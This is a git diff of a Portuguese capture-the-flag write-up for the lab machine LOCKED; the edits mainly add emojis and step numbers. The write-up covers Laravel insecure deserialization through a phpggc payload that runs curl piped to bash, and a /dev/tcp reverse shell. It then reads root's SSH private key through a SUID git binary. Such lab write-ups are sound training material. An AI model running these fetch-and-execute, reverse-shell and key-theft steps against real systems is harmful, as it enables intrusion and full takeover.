@@ -2,11 +2,11 @@
 
 ![Reborn image](/images/hackingclub-locked/file-locked-2025-1.png)
 
-## Sumário
+## 📝 Sumário
 
-A máquina LOCKED (dificuldade Easy) apresenta uma cadeia de comprometimento que começou com uma vulnerabilidade de PHP insecure deserialization no aplicativo web. A falha permitiu enviar dados serializados maliciosos que, ao serem desserializados pelo servidor, levaram à execução remota de código (RCE). A partir desse ponto inicial o atacante obteve execução de comandos no contexto do processo PHP e pôde explorar o sistema de arquivos e a configuração local. Durante o reconhecimento foi identificado um binário git marcado com SUID — uma configuração sensível que permitia ao usuário que o executasse ler arquivos que normalmente exigiriam privilégios elevados. Aproveitando esse SUID foi possível ler o arquivo de chave privada root (/root/.ssh/id_rsa), importar a chave e estabelecer uma sessão SSH autenticada como root, alcançando assim controle total do sistema.
+A máquina LOCKED apresenta uma cadeia de comprometimento que começou com uma vulnerabilidade de PHP insecure deserialization no aplicativo web. A falha permitiu enviar dados serializados maliciosos que, ao serem desserializados pelo servidor, levaram à execução remota de código (RCE). A partir desse ponto inicial o atacante obteve execução de comandos no contexto do processo PHP e pôde explorar o sistema de arquivos e a configuração local. Durante o reconhecimento foi identificado um binário git marcado com SUID — uma configuração sensível que permitia ao usuário que o executasse ler arquivos que normalmente exigiriam privilégios elevados. Aproveitando esse SUID foi possível ler o arquivo de chave privada root (/root/.ssh/id_rsa), importar a chave e estabelecer uma sessão SSH autenticada como root, alcançando assim controle total do sistema.
 
-## Descoberta de aplicativo web
+## 🔒 Descoberta de aplicativo web
 
 Precisamos acrescentar o host em nosso arquivo `/etc/hosts`:
 
@@ -14,9 +14,9 @@ Precisamos acrescentar o host em nosso arquivo `/etc/hosts`:
 echo "$IP locked.hc" | sudo tee -a /etc/hosts
 ```
 
-## Reconhecimento
+## 👁️‍🗨️ Reconhecimento
 
-### Varedura de portas
+### 🚪 Varedura de portas
 
 O `nmap` foi utilizado para mapear portas e serviços ativos na máquina alvo. O scan revelou apenas duas portas abertas:
 
@@ -32,7 +32,7 @@ PORT   STATE SERVICE REASON         VERSION
 80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.58 ((Ubuntu))
 ```
 
-## Analisando o aplicativo web
+## 🔎 Analisando o aplicativo web
 
 Foi identificada uma vulnerabilidade de leak de informações em uma aplicação construída com o framework Laravel. Ao enviar o parâmetro nome (ou name) como um array na requisição de login, a aplicação lança um erro PHP (trim(): Argument #1 (string) must be of type string, array given) que só aparece porque o modo debug (APP_DEBUG) está habilitado em produção. O erro expõe stack trace e caminhos internos, possibilitando informação sensível sobre a estrutura do servidor e do código.
 
@@ -61,13 +61,13 @@ phpggc -c laravel/rce16 system "curl -sSL http://10.0.73.93:8000/shell.sh | bash
 
 ![Payload](/images/hackingclub-locked/file-locked-2025-6.png)
 
-Criamos um arquivo contendo a payload de shell reversa e hospedamos localmente para que seja baixado e executado no servidor.
+1.      Criamos um arquivo contendo a payload de shell reversa e hospedamos localmente para que seja baixado e executado no servidor.
 
 ```bash
 echo "sh -i >& /dev/tcp/10.0.73.93/1234 0>&1" > shell.sh
 ```
 
-Subindo um servidor em python.
+2.      Subindo um servidor em python.
 
 ```bash
 python3 -m http.server 8000
@@ -75,33 +75,33 @@ python3 -m http.server 8000
 
 ![Files](/images/hackingclub-locked/file-locked-2025-7.png)
 
-Obtemos a shell reversa através da deserialização insegura.
+3.      Obtemos a shell reversa através da deserialização insegura.
 
 ![Reverse Shell](/images/hackingclub-locked/file-locked-2025-8.png)
 
-## Dicas
+## 📚 Dicas
 
 ### Shell Interativa
 
 Transformamos uma shell limitada numa TTY completa para permitir edição de linha, sinais (Ctrl+C), job control e melhor interatividade.
 
-#### Inicia uma TTY bash interativa.
+1.      Inicia uma TTY bash interativa.
 ```bash
 python3 -c "import pty;pty.spawn('/bin/bash')" - CTRL+Z
 ```
 
-#### Ajusta o terminal para modo bruto (sem eco) e traz a shell em foreground para funcionar corretamente.
+2.      Ajusta o terminal para modo bruto (sem eco) e traz a shell em foreground para funcionar corretamente.
 ```bash
 stty raw -echo ; fg
 ``` 
 
 ![Dica](/images/hackingclub-locked/file-locked-2025-9.png)
 
-### Capturando a primeira flag
+### 🔐 Capturando a primeira flag
 
 ![Primary Flag](/images/hackingclub-locked/file-locked-2025-10.png)
 
-## Privilege Escalation
+## 📈 Privilege Escalation
 
 Encontrei o binário do `git` com permissão `SUID` — ou seja, ele será executado com os privilégios do dono do arquivo (normalmente `root`). Isso permite que, se explorado, comandos ou operações iniciadas via esse binário sejam executados com privilégios elevados, tornando-o um vetor potencial para escalonamento de privilégios.
 
@@ -115,7 +115,7 @@ As permissões inadequadas desse binário, nos permite ler arquivos sensíveis e
 
 ![SUID Read File](/images/hackingclub-locked/file-locked-2025-12.png)
 
-### SSH
+### ☣︎ SSH
 
 Durante a varredura identificamos a porta 22 aberta (serviço SSH) e verificamos que é possível ler a chave privada do usuário root a partir do sistema.
 
@@ -144,6 +144,6 @@ ssh -i id_rsa root@127.0.0.1
 
 ![SSH Root](/images/hackingclub-locked/file-locked-2025-15.png)
 
-### Capturando a segunda flag
+### 🔐 Capturando a segunda flag
 
 ![Secondary Flag](/images/hackingclub-locked/file-locked-2025-16.png)
